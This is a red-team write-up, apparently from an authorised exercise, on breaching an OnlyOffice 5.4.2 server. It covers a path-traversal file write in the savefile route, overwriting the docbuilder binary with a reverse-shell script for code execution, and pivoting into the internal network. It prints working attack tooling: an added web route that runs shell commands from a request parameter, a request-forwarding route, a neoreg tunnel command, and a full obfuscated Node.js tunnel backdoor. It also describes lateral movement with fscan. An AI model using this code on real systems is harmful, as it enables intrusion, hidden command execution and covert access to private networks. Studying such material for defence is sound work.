# 红队实录系列(一)-从 NodeJS 代码审计到内网突破
**概    述**

此实录起因是公司的一场红蓝对抗实战演习，首先通过内部自研资产平台通过分布式扫描对目标资产进行全端口指纹识别。在目标的一个IP资产开放了一个高端口Web服务，进一步通过指纹识别的方式发现是 OnlyOffice 服务。第一次遇到 OnlyOffice 服务（Express框架)，后续整个渗透流程就是通过老洞到分析代码找到新利用方式，最终通过任意文件写新利用方式实现了RCE，突破进入内网。

**老洞新用**

资产收集找到了如图所示的资产，即使从来没碰到过，根据页面也能发现使用的是OnlyOffice。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/04edf62a-85a2-4d99-ba96-25dfa77e67b7.png?raw=true)

扫描发现存在/index.html路由，直接拿到了目标的版本号，在dockerhub上找到了一样的版本onlyoffice/documentserver:5.4.2.46，5.4.2已经是3年前的版本了，很可能会存在一些老洞。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/45ec7aa0-a441-455a-aca2-1d0ec0bf8d9f.png?raw=true)

搜索发现了存在多个老洞，https://github.com/moehw/poc\_exploits，CVE-2021-3199是一个任意文件写漏洞，影响小于5.6.3的版本，并且还有POC https://github.com/moehw/poc\_exploits/blob/master/CVE-2021-3199/poc_uploadImageFile.py，使用该POC验证我们的目标时，文件上传都无法成功。分析发现CVE-2021-3199 是利用的uploadImageFile方法，存在一定的限制。

```javascript
var format = formatChecker.getImageFormat(buffer, undefined);
var formatStr = formatChecker.getStringFromFormat(format);

if (encrypted && PATTERN_ENCRYPTED === buffer.toString('utf8', 0, PATTERN_ENCRYPTED.length)) {
  formatStr = buffer.toString('utf8', PATTERN_ENCRYPTED.length, buffer.indexOf(';', PATTERN_ENCRYPTED.length));
}
```

uploadImageFile方法中，formatStr变量来自于根据文件内容进行识别。如果encrypted为true，那么就会从post body中解析出formatStr，从而实现控制文件名。

```javascript
if (cfgTokenEnableBrowser) {
  let checkJwtRes = docsCoServer.checkJwtHeader(docId, req, 'Authorization', 'Bearer ', commonDefines.c_oAscSecretType.Session);
  if (!checkJwtRes) {
    
    checkJwtRes = docsCoServer.checkJwt(docId, req.query['token'], commonDefines.c_oAscSecretType.Session);
  }
  let transformedRes = checkJwtUploadTransformRes(docId, 'uploadImageFile', checkJwtRes);
  if (!transformedRes.err) {
    docId = transformedRes.docId || docId;
    encrypted = transformedRes.encrypted;
  } else {
    isValidJwt = false;
  }
}
```

而encrypted需要配置了cfgTokenEnableBrowser，"Directory traversal with Remote Code Execution when JWT is used in Document Server before 5.6.3"，需要配置了JWT时才能利用，Docker环境默认未启用，目标也未启用。

其他的老洞没POC，只能下一份5.4.2.46版本的代码，分析是否存在其他的利用了。

DocService/sources/server.js 存在一个savefile路由，看到这名字就能猜到是文件上传相关的路由。

```javascript
app.post('/savefile/:docid', rawFileParser, canvasService.saveFile);
```

路由方法具体实现如下：

```javascript
exports.saveFile = function(req, res) {
  return co(function*() {
    let docId = 'null';
    try {
      let startDate = null;
      if (clientStatsD) {
        startDate = new Date();
      }

      let strCmd = req.query['cmd'];
      let cmd = new commonDefines.InputCommand(JSON.parse(strCmd));
      docId = cmd.getDocId();
      logger.debug('Start saveFile: docId = %s', docId);

      if (cfgTokenEnableBrowser) {
        let isValidJwt = false;
        let checkJwtRes = docsCoServer.checkJwt(docId, cmd.getTokenSession(), commonDefines.c_oAscSecretType.Session);
        if (checkJwtRes.decoded) {
          let doc = checkJwtRes.decoded.document;
          var edit = checkJwtRes.decoded.editorConfig;
          if (doc.ds_encrypted && !edit.ds_view && !edit.ds_isCloseCoAuthoring) {
            isValidJwt = true;
            docId = doc.key;
            cmd.setDocId(doc.key);
          } else {
            logger.warn('Error saveFile jwt: docId = %s\r\n%s', docId, 'access deny');
          }
        } else {
          logger.warn('Error saveFile jwt: docId = %s\r\n%s', docId, checkJwtRes.description);
        }
        if (!isValidJwt) {
          res.sendStatus(403);
          return;
        }
      }
      cmd.setStatusInfo(constants.NO_ERROR);
      yield* addRandomKeyTaskCmd(cmd);
      cmd.setOutputPath(constants.OUTPUT_NAME + pathModule.extname(cmd.getOutputPath()));
      yield storage.putObject(cmd.getSaveKey() + '/' + cmd.getOutputPath(), req.body, req.body.length);
```

首先对cmd参数进行了一次JSON解析，由于默认未开启cfgTokenEnableBrowser，所以可以直接跳过中间一部分。

最后调用了storage.putObject方法写文件，

文件地址： cmd.getSaveKey() + '/' + cmd.getOutputPath()

文件内容来源于req.body ，也就是POST body。

cmd变量来自于对cmd参数值的JSON解析，在yield* addRandomKeyTaskCmd(cmd)方法中，

```javascript
function* addRandomKeyTaskCmd(cmd) {
  var task = yield* taskResult.addRandomKeyTask(cmd.getDocId());
  cmd.setSaveKey(task.key);
}
```

调用了savekey setter，随机生成taskkey再重新设置savekey属性值，导致不再可控。虽然savekey无法控制，但是outputpath没有被重新设置，还是来源于参数值，所以这里通过outputpath可以实现目录穿越到任意地址写文件。

返回400，不过文件实际已经写入，这里的web路径来源于搭建的docker环境中找到的，在测试目标时，使用这个目录也成功写入，怀疑目标一样也是用的docker。

虽然已经能任意地址文件写，但也仅仅只是开始。

Nodejs不像传统PHP、JAVA、ASPX，能够通过写入脚本类Webshell文件实现代码执行。那么如何从一个文件写到RCE？

**武器化利用**

**1**►

**写计划任务**

最容易想到的方法，写入文件到计划任务目录中实现RCE，

不过从搭建的docker环境中发现，跑express的用户非root，应该是无法通过计划任务实现RCE。实际测试目标，通过计划任务往

/var/www/onlyoffice/documentserver/server/welcome/目录写文件，最终也未成功，应该就是权限问题。

**2**►

**覆盖原始web文件注册路由**

跑express的用户为ds, web下的文件所属用户也都为ds，那么可以通过覆盖web的一些文件实现RCE。

首先会想到覆盖js文件，新增路由实现RCE，但是比较麻烦的是node需要重启才会加载上新增的路由，而我们暂时无法做到让目标重启。

既然不能重启，那么很容易就能想到通过覆盖模板文件再通过SSTI RCE，覆盖模板文件后不需要重启服务即可利用，不过最后发现onlyoffice根本就没用到模板。

至此，只能找OnlyOffice中是否存在命令执行调用elf的路由，通过任意文件写覆盖elf来实现命令执行。

```typescript
app.post('/docbuilder', utils.checkClientIp, rawFileParser, (req, res) => {
   converterService.builder(req, res);
});
```

存在一个docbuilder路由，看名字应该是用来生成文档的，该路由方法的实现代码大概如下：

```javascript
function builderRequest(req, res) {
  return co(function* () {
    let docId = 'builderRequest';
    ..................................
    if (error === constants.NO_ERROR &&
  (params.key || params.url || (req.body && Buffer.isBuffer(req.body) && req.body.length > 0))) {
  docId = params.key;
  let cmd = new commonDefines.InputCommand();
  cmd.setCommand('builder');
  cmd.setIsBuilder(true);
  cmd.setWithAuthorization(true);
  cmd.setDocId(docId);
  if (!docId) {
    let task = yield* taskResult.addRandomKeyTask(undefined, 'bld_', 8);
    docId = task.key;
    cmd.setDocId(docId);
    if (params.url) {
      cmd.setUrl(params.url);
      cmd.setFormat('docbuilder');
    } else {
      yield storageBase.putObject(docId + '/script.docbuilder', req.body, req.body.length);
    }
    let queueData = new commonDefines.TaskQueueData();
    queueData.setCmd(cmd);
    yield* docsCoServer.addTask(queueData, constants.QUEUE_PRIORITY_LOW); 
  }
  .................
  cmd.setStatusInfo(constants.CONVERT_DEAD_LETTER);
canvasService.receiveTask(JSON.stringify(task), function(){}); 
```

调用addTask方法，将生成doc的任务加到队列中。

```javascript
function receiveTask(data, ack) {
  return co(function* () {
    var res = null;
    var task = null;
    try {
      task = new commonDefines.TaskQueueData(JSON.parse(data));
      if (task) {
        res = yield* ExecuteTask(task);
      }
```

在接收到任务后，调用ExecuteTask方法，执行该任务，

```javascript
function* ExecuteTask(task) {
fs.mkdirSync(path.join(tempDirs.result, 'output'));
processPath = cfgDocbuilderPath;
.........
let spawnAsyncPromise = spawnAsync(processPath, childArgs, spawnOptions);
```

简单点说就是在ExecuteTask方法中，会通过spawnAsync命令执行方法调用 /var/www/onlyoffice/documentserver/server/FileConverter/bin/docbuilder ELF来生成文档，docbuilder文件所属用户也是ds，那么可以通过之前的文件写漏洞覆盖掉docbuilder ELF，再通过docbuilder路由触发我们上传的ELF。

写了一个简易的bash反弹脚本覆盖了/var/www/onlyoffice/documentserver/server/FileConverter/bin/docbuilder文件，本地测试Docker环境直接反弹SHELL成功，但是以我们对目标公司的了解，99.99%是无法连接外网的。

首先还是得让命令执行执行得更顺畅一点，新增一个命令执行的路由，这时候我们已经能够通过docbuilder的命令执行 新增路由、重启服务了。

在本地的docker环境中，服务是ROOT用户通过supervisor来启动的。

虽然supervisor是ROOT启动的，不过任意用户都能重启supervisor服务。

```typescript
app.all('/runExec.json', (req, res) => {
   const spawn = require('child_process').spawn;
   var username = req.query.username ? req.query.username: req.header("username");
   if(!username){
    res.send("empty para!");
   }else {
    const cmd = spawn('sh', ['-c', username]);
    var result = "";
    cmd.stdout.on('data', (data) => {
     result += data;
    });

    cmd.on('close', (code) => {
     res.send(result);
     return res.end();
    })
   }
  });
```

在DocService/sources/server.js中，新增了一个如上的runExec.json路由，用于命令执行直接回显。

最开始为了实现nodejs命令执行回显，直接从网上复制了一段child_process.execSync命令执行的代码，差点被这个坑死，execSync在子进程完全关闭之前不会返回。导致在通过execSync命令执行curl一个不存在的站时会等待一段时间，这时候OnlyOffice这web就直接卡死访问不到了，还好curl默认会一段时间超时结束掉，如果执行了ping xx或者运行了一个无返回的elf会直接导致站挂掉，吓得赶紧把execSync换成spawn。

**3**►

**搭建代理直通内网**

通过 /runExec.json 命令执行，验证了目标确实各种协议都无法出网，为了进行内网渗透肯定得搭建代理。

在常规渗透中如果目标无法出网，通常会使用Neo-Regeorg等工具落地脚本文件实现代理进行内网渗透，但是很尴尬的是Neo-Regeorg并未提供js的脚本。Regeorg倒提供了JS版本https://github.com/sensepost/reGeorg/blob/master/tunnel.js ，但是实测问题很多没法使用。为了解决这个问题，我们开始吭哧吭哧的改Nodejs版的Neo-Regeorg，折腾了一两天改出来的Nodejs版Neo存在Bug只能代理HTTP流量，HTTPS、SSH等服务都有问题，也没发现是哪出的问题，然后就暂时搁置了这套方案。

在没有内网代理的情况下，内网渗透搁置了下来，大概思考了下，想出了三个方案：

1、继续修改Neo-Regeorg

2、通过命令执行，利用curl横移拿下一些机器后可能存在能够出网的机器

3、做WebSocket代理 （没找到现成合适的工具）

为了实现curl横向，先通过命令执行写入了一个fscan的base64到OnlyOffice机器上，直接开扫。

很幸运的是直接扫到了一些存在漏洞的财务系统，直接利用bsh实现了命令执行，但是很尴尬，拿了好几台内网的机器依然都是各种协议无法出网，再次陷入僵局。

虽然横向的机器也无法出网，不过该Web应用是Java，所以能直接使用现成的Neo-Regeorg。那么可以落地一个Neo-Regeorg到该Java系统上，虽然外网无法访问到，可以通过OnlyOffice新增一个转发路由，将外网的HTTP请求直接转发到内网该系统上。

通过bsh写Neo-Regeorg，直接new java.io.FileOutputStream("path").write(bytes)写文件即可。

虽然开发比较菜导致写的Nodejs版Neo-Regeorg一直有问题，但是转发HTTP请求的Nodejs代码还是非常简单的，只需要原样将uri，headers，body转发到java服务器上，再原样将response拿回来即可。

```javascript
  app.all('/forward', function(req, res){

   let forwardHost = req.header("forwardHost");
   let forwardPort = req.header("forwardPort");
   let forwardPath = req.header("forwardPath");

   if(!forwardHost || !forwardPort || !forwardPath){
    return res.end("empty para");
   }else {
    let body = '';
    req.on('data', function (chunk) {
     body += chunk;
    });

    req.on('end', function () {
     let options = {
      method: req.method,
      host: forwardHost,
      port: forwardPort,
      path: forwardPath,
      headers: req.headers,
      timeout: 5000,
     }

     try {
      var callback = function (response) {
       var body = '';
       response.on('data', function (chunk) {
        body += chunk;
       });

       response.on('end', function () {
        var headers = response.headers
        if ('set-cookie' in headers) {
         var set = headers['set-cookie'];
         headers['set-cookie'][0] = set[0].substring(0, set[0].indexOf('Path=/') + 6);
        }
        res.set(headers)
        return res.end(body);
       });
      }

      let requests = http.request(options, callback);
      requests.write(body);
      requests.end();
     } catch (e) {
      return res.end(e.message);
     }
    })
   }
  })
```

新增forward路由后，重启OnlyOffice服务，通过以下命令成功代理到了目标内网。

```nginx
python3 neoreg.py -u http://onlyofficeHost/forward -k pass -p 8888 -H "forwardHost: NCHOST" -H "forwardPort: 9081" -H "forwardPath: /uri.jsp"
```

项目结束后，问了下 purpleroc 大佬，直接帮我解决了Bug，直接完善了方案1，通过新增如下的路由，重启服务后可直接实现代理。

```javascript
function StrTr(input, frm, to){
  var r = "";
  for(i=0; i<input.length; i++){
    index = frm.indexOf(input[i]);
    if(index != -1){
      r += to[index];
    }else{
      r += input[i];
    }
  }
  return r;
}

var net = require('net');

sessions = {}

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

router.all('/proxy.php', function(req, res) {

  const writebuffunc = async (session, mark) => {
    writebuf = "writebuf" + mark;
    readbuf = "readbuf" + mark;
    tcphandle = "tcphandle" + mark;
    run = "run" + mark;
    while (session[run]) {
      
      
        
        
        
        if (session[writebuf].length == 0) {
          await delay(50);
        }
        if (session[writebuf] == undefined){
          
          
          return;
        }
        let writeBuff = session[writebuf].pop();
  
        if (writeBuff) {
          var a = session[tcphandle].write(writeBuff);
          
          
        }
    
    
    
  }
  }
  
  try {
    en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    de = "Y+mad20bOq8FirAnDw53GKCxU4IMVzWPTLpRXuEZsQJtfeSy6okvc9HlgN17/hBj";
    if (req.cookies.SESSIONID) {
      if (sessions[req.cookies.SESSIONID] != undefined) {
        session = sessions[req.cookies.SESSIONID];
      }else{
        session = {};
        sessions[req.cookies.SESSIONID] = session;
      }
    } else {
      session = {};
      sessions[req.cookies.SESSIONID] = session;
    }

    var cmd = req.header("Ygcohluhosnj");
    if (cmd) {
      mark = cmd.substring(0, 22);
      cmd = cmd.substring(22);
      run = "run" + mark;

      writebuf = "writebuf" + mark;
      readbuf = "readbuf" + mark;
      tcphandle = "tcphandle" + mark;
      
    }

    switch (cmd) {
      case 'Og_97W8l8U3Ujn7ubVvIEB4YcoTusKmiKSbF70fv9UfRGUCOr0mrzyFrZ81fL': {
        
        target_ary = Buffer.from(StrTr(req.header("Ywflea"), de, en), 'base64').toString().split("|")
        target = target_ary[0];
        port = parseInt(target_ary[1]);
        session[tcphandle] = new net.Socket();
        session[tcphandle].connect(port, target, mark);

        console.log("tcpConn: ")

        session[tcphandle].on('data', function (data) {
          
          
          if (data) {
            session[readbuf].unshift(data);
          }
        })

        session[tcphandle].on('connect', async function () {
          session[run] = true;
          session[writebuf] = new Array();
          session[readbuf] = new Array();
        });

        session[tcphandle].on('error', function (error) {
          session[tcphandle].destroy();
          session[run] = false;
          res.set({
            'Eegmsjowdhwriinoj': 'z3Fx6vOKX8m3Dm5yUUNQASxM862WJxEv8xVRY8h2jObzFHI',
            'Zhdmrecmdz': 'efrlfKv5iVJppPNd_IfOkDfOY0WVf0cJo6Nd4roKtFVV4L4PyN_ZJJN9PeJVrq'
          });
          return res.end();
        });
        break;
      }
      case 'rtIwgIRShAOWL2ltogrJNQlVpF': {
        
        console.log("[!] Disconnect");
        console.log(mark);
        session[run] = false;
        
        
        
        
        
        
        
        

        return res.end();
      }
      
      case 'HbQ3SDPRgsvCxb8Llh7gcB': {
        var readBuffer = "";
        if (session[readbuf] == undefined) {
          return res.end();
        }
        if (session[readbuf].length > 0) {
            readBuffer = session[readbuf].pop();
          }

        running = session[run];
        writebuffunc(session, mark);

        if (running) {
          res.set('Eegmsjowdhwriinoj', 'MYBTsrWPJojQDO2hE');
          res.set('Connection', 'Keep-Alive');

          var body = StrTr(Buffer.from(readBuffer).toString('base64'), en, de);
          
          var _tmp = Buffer.from(readBuffer).toString("hex");
          
          

          res.send(body);
          return res.end();
        } else {
          res.set({'Eegmsjowdhwriinoj': 'z3Fx6vOKX8m3Dm5yUUNQASxM862WJxEv8xVRY8h2jObzFHI'});
          return res.end();
        }
      }
      
      case 'G9s6SEScPwNi1i_MjDmD_a6LfQ1chmmkliBIQvmpAwGz2VdDfC1zWk': {

        running = session[run];
        if (!running) {
          res.set({
            'Eegmsjowdhwriinoj': 'z3Fx6vOKX8m3Dm5yUUNQASxM862WJxEv8xVRY8h2jObzFHI',
            'Zhdmrecmdz': 'smkxMnqXU5EvPLsZf1f8UaJNmnJr3YCbM'
          });
          return res.end();
        } else {
          res.set('Content-Type', 'application/octet-stream');

          let chunk1 = '';
          req.on('data', function (chunk) {
            chunk1 = chunk;
          });

          req.on('end', function () {

            let body = chunk1.toString();
            if (body) {
              var _tmp = new Buffer.from(StrTr(body, de, en), 'base64');
              session[writebuf].unshift(new Buffer.from(StrTr(body, de, en), 'base64'));
              
              
              
              res.set({'Eegmsjowdhwriinoj': 'MYBTsrWPJojQDO2hE', 'Connection': 'Keep-Alive'});
              return res.end();
            } else {
              res.set({
                'Eegmsjowdhwriinoj': 'z3Fx6vOKX8m3Dm5yUUNQASxM862WJxEv8xVRY8h2jObzFHI',
                'Zhdmrecmdz': 'xMU7R9dZ3SG8by8hMwlc7z5M'
              });
              return res.end();
            }
          })
        }
        break;
      }
      default: {
        var sessionid = 'Ur' + Math.random();
        res.set({'Set-Cookie': 'SESSIONID=' + sessionid + ';'});
        sessions[sessionid] = {};
        return res.end("<!-- nFPltXUCizWaY6SWPp -->");
      }
    }
  }catch(e){
   console.log(e);
    
    return res.end();
  }

});
```

他也提了pull requests，https://github.com/L-codes/Neo-reGeorg/pull/66，添加该路由后就能直接使用NodeJS版本正向代理。

**总    结**

在项目结束后，我们去分析了最新版的savefile路由，发现该漏洞已经修复，同时我们也去分析了最新版本的OnlyOffice代码，也找到了最新版本的RCE漏洞，已提交给官方。此次攻击流程颇为艰辛与复杂，最后还是通过代码审计与武器开发能力，完成最后的攻击。

（边界无限烛龙实验室供稿）